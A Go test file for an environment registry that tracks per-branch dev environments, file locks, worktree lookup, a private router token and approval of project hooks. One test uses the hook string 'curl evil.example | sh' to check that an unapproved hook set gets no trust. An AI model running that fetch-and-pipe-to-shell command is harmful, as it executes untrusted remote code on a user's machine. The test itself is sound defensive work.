package registry

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"runtime"
	"sync"
	"testing"
	"time"
)

func newStore(t *testing.T) *Store {
	t.Helper()
	s, err := Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	return s
}

func TestReadMissingRegistryIsEmpty(t *testing.T) {
	s := newStore(t)
	r, err := s.Read()
	if err != nil {
		t.Fatal(err)
	}
	if len(r.Projects) != 0 {
		t.Errorf("projects = %v", r.Projects)
	}
	if r.Schema != Schema {
		t.Errorf("schema = %d", r.Schema)
	}
}

func TestUpdateWritesAtomically(t *testing.T) {
	s := newStore(t)
	ctx := context.Background()

	err := s.Update(ctx, func(r *Registry) error {
		p := r.Project("demo", "/repo")
		p.Envs["feat-x"] = &Env{
			Slug: "feat-x", Project: "demo", Branch: "feat/x", Slot: 1,
			State: StateRunning, CreatedAt: time.Now(),
		}
		r.Touch()
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}

	r, err := s.Read()
	if err != nil {
		t.Fatal(err)
	}
	e, err := r.Env("demo", "feat-x")
	if err != nil {
		t.Fatal(err)
	}
	if e.Branch != "feat/x" || e.Slot != 1 {
		t.Errorf("env = %+v", e)
	}
	if e.ComposeProject() != "grove-demo-feat-x" {
		t.Errorf("compose project = %q", e.ComposeProject())
	}
}

func TestUpdateSkipsWriteWhenClean(t *testing.T) {
	s := newStore(t)
	ctx := context.Background()
	if err := s.Update(ctx, func(r *Registry) error { return nil }); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(s.Path("registry.json")); !errors.Is(err, os.ErrNotExist) {
		t.Error("a no-op update should not create the file")
	}
}

func TestUpdateRollsBackOnError(t *testing.T) {
	s := newStore(t)
	ctx := context.Background()
	want := errors.New("boom")
	err := s.Update(ctx, func(r *Registry) error {
		r.Project("demo", "/repo")
		r.Touch()
		return want
	})
	if !errors.Is(err, want) {
		t.Fatalf("err = %v", err)
	}
	r, _ := s.Read()
	if len(r.Projects) != 0 {
		t.Error("a failed update must not be persisted")
	}
}

func TestEnvNotFound(t *testing.T) {
	s := newStore(t)
	r, _ := s.Read()
	_, err := r.Env("demo", "nope")
	if !errors.Is(err, ErrEnvNotFound) {
		t.Errorf("err = %v, want ErrEnvNotFound", err)
	}
}

func TestConcurrentUpdatesSerialise(t *testing.T) {
	s := newStore(t)
	ctx := context.Background()
	const n = 12
	var wg sync.WaitGroup
	errs := make([]error, n)
	for i := range n {
		wg.Add(1)
		go func() {
			defer wg.Done()
			errs[i] = s.Update(ctx, func(r *Registry) error {
				p := r.Project("demo", "/repo")
				used := p.UsedSlots()
				slot := 0
				for k := 1; k <= 64; k++ {
					if !used[k] {
						slot = k
						break
					}
				}
				p.Envs[slugFor(slot)] = &Env{Slug: slugFor(slot), Project: "demo", Slot: slot}
				r.Touch()
				return nil
			})
		}()
	}
	wg.Wait()
	for i, err := range errs {
		if err != nil {
			t.Fatalf("update %d: %v", i, err)
		}
	}
	r, err := s.Read()
	if err != nil {
		t.Fatal(err)
	}
	p, _ := r.LookupProject("demo")
	if len(p.Envs) != n {
		t.Fatalf("got %d envs, want %d: the lock did not serialise updates", len(p.Envs), n)
	}
	seen := map[int]bool{}
	for _, e := range p.Envs {
		if seen[e.Slot] {
			t.Fatalf("slot %d handed out twice", e.Slot)
		}
		seen[e.Slot] = true
	}
}

func slugFor(slot int) string { return "env-" + string(rune('a'+slot-1)) }

func TestLockBusy(t *testing.T) {
	s := newStore(t)
	l1, err := NewLock(s.Path("locks", "t.lock"), "test")
	if err != nil {
		t.Fatal(err)
	}
	if err := l1.Acquire(context.Background(), time.Second); err != nil {
		t.Fatal(err)
	}
	defer l1.Release()

	l2, err := NewLock(s.Path("locks", "t.lock"), "test")
	if err != nil {
		t.Fatal(err)
	}
	err = l2.Acquire(context.Background(), 150*time.Millisecond)
	if !errors.Is(err, ErrLockBusy) {
		t.Fatalf("err = %v, want ErrLockBusy", err)
	}
	if !l2.Busy() {
		t.Error("Busy should report the held lock")
	}
}

func TestFindByWorktree(t *testing.T) {
	s := newStore(t)
	ctx := context.Background()
	base := t.TempDir()
	wt := filepath.Join(base, "feat-x")
	if err := s.Update(ctx, func(r *Registry) error {
		p := r.Project("demo", base)
		p.Envs["feat-x"] = &Env{Slug: "feat-x", Project: "demo", Worktree: wt}
		r.Touch()
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	r, _ := s.Read()

	if e, ok := r.FindByWorktree(filepath.Join(wt, "api", "internal")); !ok || e.Slug != "feat-x" {
		t.Errorf("nested directory did not resolve: %v %v", e, ok)
	}
	if e, ok := r.FindByWorktree(wt); !ok || e.Slug != "feat-x" {
		t.Errorf("worktree root did not resolve: %v %v", e, ok)
	}
	if _, ok := r.FindByWorktree(base); ok {
		t.Error("the parent directory must not resolve to the env")
	}
	if _, ok := r.FindByWorktree(filepath.Join(base, "feat-xyz")); ok {
		t.Error("a sibling with a prefix name must not resolve")
	}
}

func TestRouterTokenIsCreatedOnceAndPrivate(t *testing.T) {
	s := newStore(t)
	tok, err := s.RouterToken()
	if err != nil {
		t.Fatal(err)
	}
	if len(tok) < 32 {
		t.Errorf("token is too short: %q", tok)
	}
	again, err := s.RouterToken()
	if err != nil {
		t.Fatal(err)
	}
	if again != tok {
		t.Error("the token must be stable across reads")
	}
	if runtime.GOOS != "windows" {
		st, err := os.Stat(s.Path(TokenFile))
		if err != nil {
			t.Fatal(err)
		}
		if st.Mode().Perm() != 0o600 {
			t.Errorf("token mode = %#o, want 0600", st.Mode().Perm())
		}
	}
}

func TestHookTrust(t *testing.T) {
	s := newStore(t)
	ctx := context.Background()
	hooks := []string{"pnpm install"}
	if err := s.Update(ctx, func(r *Registry) error {
		p := r.Project("demo", "/repo")
		if p.HooksTrusted(hooks) {
			t.Error("a hook set must not be trusted before approval")
		}
		if !p.HooksTrusted(nil) {
			t.Error("an empty hook set is trivially trusted")
		}
		r.TrustHooks(p, hooks)
		if !p.HooksTrusted(hooks) {
			t.Error("approval was not recorded")
		}
		if p.HooksTrusted([]string{"curl evil.example | sh"}) {
			t.Error("a different hook set must not inherit trust")
		}
		return nil
	}); err != nil {
		t.Fatal(err)
	}
}
